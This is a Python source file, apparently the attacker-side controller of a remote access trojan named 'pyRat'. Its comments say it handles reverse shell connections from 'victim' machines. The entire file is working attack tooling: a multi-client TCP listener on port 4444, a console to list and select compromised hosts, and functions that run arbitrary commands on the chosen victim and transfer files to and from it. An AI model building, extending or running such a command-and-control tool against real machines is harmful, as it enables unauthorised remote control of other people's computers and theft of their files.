# -*- coding: utf-8 -*-
# Author: Yiğit Şık 06/11/2021

# This script will establish the reverse shell connection between attacker and victim machine
# Commands taken from attacker will be executed through this script on victim computer,
# then the results will be sent back

# Built-in Modules
import base64
import socket
import threading
import time
from queue import Queue

# Third Party Modules
import json


class Listener:

    NUMBER_OF_THREADS = 2
    JOB_NUMBER = [1, 2]
    queue = Queue()
    Ip = "127.0.0.1"
    Port = 4444
    target = None
    target_ip = ""
    connection_list = []
    address_list = []

    # Create and listen a tcp server socket with given ip and port values.
    def __init__(self):

        self.create_workers()
        self.create_jobs()

    def create_workers(self):
        for _ in range(self.NUMBER_OF_THREADS):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):
        while True:
            x = self.queue.get()

            if x == 1:
                self.listen()
            if x == 2:
                self.terminal()

            self.queue.task_done()

    def create_jobs(self):
        for x in self.JOB_NUMBER:
            self.queue.put(x)
        self.queue.join()

    def create_socket(self, ip, port):
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.bind((ip, port))
            listener.listen(5)
            return listener
        except Exception as msg:
            print(msg)

    def listen(self):

        listener = self.create_socket(self.Ip, self.Port)
        print("[+] Waiting for incoming connections")

        while True:

            try:
                # Wait for first connection. This is a blocking code
                response = listener.accept()
                listener.setblocking(True)
                self.connection_list.append(response[0])
                self.address_list.append(response[1])
                print("[+] Got a connection" + str(response[1]))
            except Exception as msg:
                print(msg)

    def list_connections(self):

        results = ""

        if len(self.connection_list) < 1:
            print("There is no connection yet")
        else:

            for i, connection in enumerate(self.connection_list):

                try:
                    # Check if connection is still available
                    connection.send(json.dumps("AreYouAwake?").encode())
                    connection.recv(1024)
                except:
                    # If connection is not available anymore, clear from list
                    del self.connection_list[i]
                    del self.address_list[i]
                    print("Clearing Dead Connections")
                    continue

                results += str(i) + "   " + str(self.address_list[i][0]) + "   " + str(self.address_list[i][1]) + "\n"

            print("----Clients----" + "\n" + results)

    # def select_target(self):

    # Send Messages as Json format for data integrity purposes
    # Sending data plainly might cause problems because end of the data stream cannot be known
    def send_data(self, data):
        json_data = json.dumps(data).encode()
        self.target.send(json_data)

    # Read data in 1024 byte chunks until json file is fully received
    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.target.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    # Send commands to be executed on victim machine
    def execute_remotely(self, command):
        self.send_data(command)
        if command[0] == "exit":
            self.target.close()
            exit()
        return self.receive_data()

    # Read and write files in base64 format to transfer bytes reliably.
    def read_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except FileNotFoundError as e:
            print(e.strerror)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def terminal(self):

        ascii_art = """               
                     ______         _   
                      | ___ \       | |  
         _ __   _   _ | |_/ /  __ _ | |_ 
        | '_ \ | | | ||    /  / _` || __|
        | |_) || |_| || |\ \ | (_| || |_ 
        | .__/  \__, |\_| \_| \__,_| \__|
        | |      __/ |                   
        |_|     |___/                   
                    """

        print(ascii_art)

        while True:

            command = input(">>")
            command = command.split(" ")

            if command[0] == "list":
                self.list_connections()
                continue
            elif command[0] == "select":
                try:
                    selection = int(command[1])
                    self.target = self.connection_list[selection]
                    self.target_ip = self.address_list[selection]
                    print("You Have Now Connected To {}".format(self.target_ip))
                    self.connect_to_the_target()
                except Exception as e:
                    print(e)
            else:
                print("Unknown Command")

    # Here we are sending commands to be executed on victim machine which their result
    # will be sent back to us
    def connect_to_the_target(self):

        result = ""

        while True:

            # Input commands from terminal
            command = input("{}>> ".format(self.target_ip[0]))
            command = command.split()

            if len(command) > 0:

                # Get files from the victim machine
                if command[0] == "download":
                    binaryFile = self.execute_remotely(command)
                    result = self.write_file(command[1], binaryFile)

                # Send files to the victim machine
                elif command[0] == "upload":
                    file_content = self.read_file(command[1])
                    if file_content is None:
                        continue
                    command.append(file_content.decode())
                    result = self.execute_remotely(command)

                elif command[0] == "list":
                    self.list_connections()
                    continue

                elif command[0] == "select":

                    selection = int(command[1])
                    self.target = self.connection_list[selection]
                    self.target_ip = self.address_list[selection]
                    print("You Have Now Connected To {}".format(self.target_ip))
                    continue

                else:
                    result = self.execute_remotely(command)

            # Print results to the terminal
            print(result)


# Create the server socket
my_listener = Listener()
